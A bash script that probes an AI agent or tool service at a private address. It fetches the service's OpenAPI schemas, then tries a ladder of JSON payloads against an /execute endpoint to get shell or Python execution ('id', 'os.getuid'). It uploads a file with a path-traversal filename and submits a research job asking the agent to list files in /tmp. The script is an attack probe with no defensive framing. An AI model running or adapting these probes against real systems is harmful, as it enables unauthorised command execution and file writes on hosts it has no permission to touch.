#!/bin/bash
set +e
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
log(){ echo "$@"; }
log "### START13 $(date -u +%FT%TZ)"
log "### SCHEMAS-18000"
timeout 10 curl -s -m 8 http://192.168.0.22:18000/openapi.json | python3 -c "
import json,sys
d=json.load(sys.stdin)
sc=d.get('components',{}).get('schemas',{})
for k in ('ActionRequest','ReasonRequest','ResearchJobRequest','ResearchControlRequest'):
    print('=====',k); print(json.dumps(sc.get(k,{}))[:800])
" 2>&1
log "### EXEC-LADDER"
for b in \
 '{"action":"python","params":{"code":"import os;print(os.getuid())"}}' \
 '{"name":"python","arguments":{"code":"1+1"}}' \
 '{"tool":"calculator","input":{"expression":"2+2"}}' \
 '{"action":"execute","command":"id"}' \
 '{"action":"shell","input":"id"}' \
 '{"query":"what is 2+2","tools":["calculator"]}' ; do
  log "-- body $b"
  timeout 20 curl -s -m 18 -X POST http://192.168.0.22:18000/execute -H 'Content-Type: application/json' -d "$b" -w "\nHTTP=%{http_code}\n" | head -c 500
done
log "### UPLOAD"
echo "ul-probe-$(date +%s)" > /tmp/ulp.txt
timeout 15 curl -s -m 12 -X POST http://192.168.0.22:14998/upload -F "file=@/tmp/ulp.txt;filename=ulp.txt" -w "\nHTTP=%{http_code}\n" | head -c 400
log "-- traversal filename"
timeout 15 curl -s -m 12 -X POST http://192.168.0.22:14998/upload -F "file=@/tmp/ulp.txt;filename=../../../../tmp/ul_trav.txt" -w "\nHTTP=%{http_code}\n" | head -c 400
log "-- list"
timeout 10 curl -s -m 8 "http://192.168.0.22:14998/files?pageSize=5&search=ul" | head -c 600; echo
log "### RESEARCH-JOB"
timeout 25 curl -s -m 22 -X POST http://192.168.0.22:18000/api/research/jobs -H 'Content-Type: application/json' -d '{"query":"list the files in /tmp","max_steps":3}' -w "\nHTTP=%{http_code}\n" | head -c 400
log "### DONE13 $(date -u +%FT%TZ)"
